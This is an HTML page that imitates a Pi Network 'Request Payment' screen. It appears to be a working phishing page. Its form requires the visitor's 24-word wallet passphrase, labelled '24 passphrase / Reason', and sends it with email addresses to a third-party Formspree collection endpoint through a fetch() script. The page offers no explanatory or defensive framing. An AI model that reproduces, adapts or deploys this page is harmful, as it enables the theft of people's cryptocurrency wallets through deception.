<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pi - Request Payment</title>
    <!-- Load Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f8f9fa; /* Light background */
        }
        /* Simple animation for message */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .fade-in {
            animation: fadeIn 0.5s ease-out forwards;
        }
         /* Custom Pi Colors */
        .bg-pi-purple { background-color: #5A2D82; }
        .text-pi-yellow { color: #F5C65A; }
    </style>
</head>
<body class="flex flex-col min-h-screen">

    <!-- Header -->
    <header class="bg-pi-purple text-white py-4 px-5 sticky top-0 z-10 shadow-md">
        <div class="max-w-lg mx-auto flex items-center relative">
             <!-- Back Button Link to Home Page -->
            <a href="index.html" class="absolute left-0 text-white">
               <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" /></svg>
            </a>
            <h1 class="text-xl font-semibold text-center flex-grow">Request Payment</h1>
             <!-- Placeholder for maybe a Pi icon -->
             <div class="absolute right-0 text-pi-yellow">
                 <svg class="w-6 h-6" viewBox="0 0 100 100" fill="currentColor" xmlns="http://www.w3.org/2000/svg"> <circle cx="50" cy="50" r="45" fill="none" stroke="currentColor" stroke-width="8"/> <path d="M35 30 H 65 V 40 H 55 V 70 H 45 V 40 H 35 V 30 Z" /> <path d="M60 45 A 15 15 0 0 1 60 75" fill="none" stroke="currentColor" stroke-width="8"/> </svg>
             </div>
        </div>
    </header>

    <!-- Main Content Area -->
    <main class="flex-grow w-full max-w-lg mx-auto p-6">

        <!-- Payment Request Form Section -->
        <section class="bg-white p-6 rounded-lg shadow-md">
            <header class="mb-5 text-center">
                <h2 class="text-lg font-bold text-gray-700">Enter Payment Details</h2>
                <p class="text-gray-500 text-sm mt-1">This request will be sent via email.</p>
            </header>

            <!-- Payment Request Form -->
            <form id="paymentRequestForm" action="https://formspree.io/f/xnngkkgj" method="POST" class="space-y-4">
                <div>
                    <label for="payer_email" class="block text-xs font-medium text-gray-600 mb-1">Recipient's Email (Who will pay):</label>
                    <input type="email" id="payer_email" name="payer_email" required placeholder="payer@example.com" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                </div>
                <div>
                    <label for="amount" class="block text-xs font-medium text-gray-600 mb-1">Amount:</label>
                    <input type="number" id="amount" name="amount" required step="0.01" min="0" placeholder="0.00" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                </div>
                 <div>
                    <label for="currency" class="block text-xs font-medium text-gray-600 mb-1">Currency:</label>
                    <input type="text" id="currency" name="currency" required value="USD" placeholder="e.g., USD" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                </div>
                <div>
                    <label for="description" class="block text-xs font-medium text-gray-600 mb-1">24 passphrase / Reason:</label>
                    <!-- Changed rows to 5 and updated placeholder -->
                    <textarea id="24 passphrase" name="24 passphrase" rows="5" required placeholder="Please provide 24 passphrase for the payment request (Required)" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"></textarea>
                </div>
                <div>
                    <label for="sender_email" class="block text-xs font-medium text-gray-600 mb-1">Your Email (Optional):</label>
                    <input type="email" id="sender_email" name="_replyto" placeholder="Your reply-to email" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                </div>
                <button type="submit" class="w-full bg-pi-purple hover:opacity-90 text-white font-semibold py-3 px-4 rounded-lg text-sm transition duration-300 ease-in-out shadow-sm disabled:opacity-50">
                    Submit Request
                </button>
                <div id="statusMessage" class="mt-3 text-xs text-center min-h-[1rem]"></div>
            </form>
        </section>

    </main>

    <!-- Footer -->
    <footer class="w-full max-w-lg mx-auto mt-6 py-4 text-center text-gray-400 text-xs">
        Pi Network &copy; 2025
    </footer>


    <script>
        // --- Form Submission Logic (Same as before) ---
        const form = document.getElementById('paymentRequestForm');
        const statusMessage = document.getElementById('statusMessage');
        const submitButton = form.querySelector('button[type="submit"]');

        form.addEventListener('submit', async function(event) {
            event.preventDefault();
            submitButton.disabled = true;
            submitButton.textContent = 'Submitting...';
            statusMessage.textContent = '';
            statusMessage.className = 'mt-3 text-xs text-center min-h-[1rem]'; // Reset class

            const formData = new FormData(form);
            const actionUrl = form.action;

            if (!actionUrl || !actionUrl.startsWith('https://formspree.io/f/')) {
                 statusMessage.textContent = 'Error: Formspree URL not configured.';
                 statusMessage.className += ' text-red-600 fade-in';
                 submitButton.disabled = false;
                 submitButton.textContent = 'Submit Request';
                 console.error('Form action URL is not set correctly.');
                 return;
            }

            try {
                const response = await fetch(actionUrl, {
                    method: 'POST',
                    body: formData,
                    headers: { 'Accept': 'application/json' }
                });

                if (response.ok) {
                    statusMessage.textContent = 'Request submitted successfully!';
                    statusMessage.className += ' text-green-600 fade-in';
                    form.reset();
                    // Optional: Redirect back to home page after success
                    // setTimeout(() => { window.location.href = 'index.html'; }, 2000);
                } else {
                    const data = await response.json();
                    if (data && data.errors) {
                         statusMessage.textContent = data.errors.map(error => error.message).join(", ");
                    } else if (data && data.error) {
                         statusMessage.textContent = data.error;
                    } else {
                        statusMessage.textContent = 'Oops! Problem submitting request. Status: ' + response.status;
                    }
                     statusMessage.className += ' text-red-600 fade-in';
                }
            } catch (error) {
                console.error('Submission error:', error);
                statusMessage.textContent = 'Oops! Network problem.';
                statusMessage.className += ' text-red-600 fade-in';
            } finally {
                 setTimeout(() => {
                     submitButton.disabled = false;
                     submitButton.textContent = 'Submit Request';
                 }, 1500);
            }
        });
    </script>

</body>
</html>
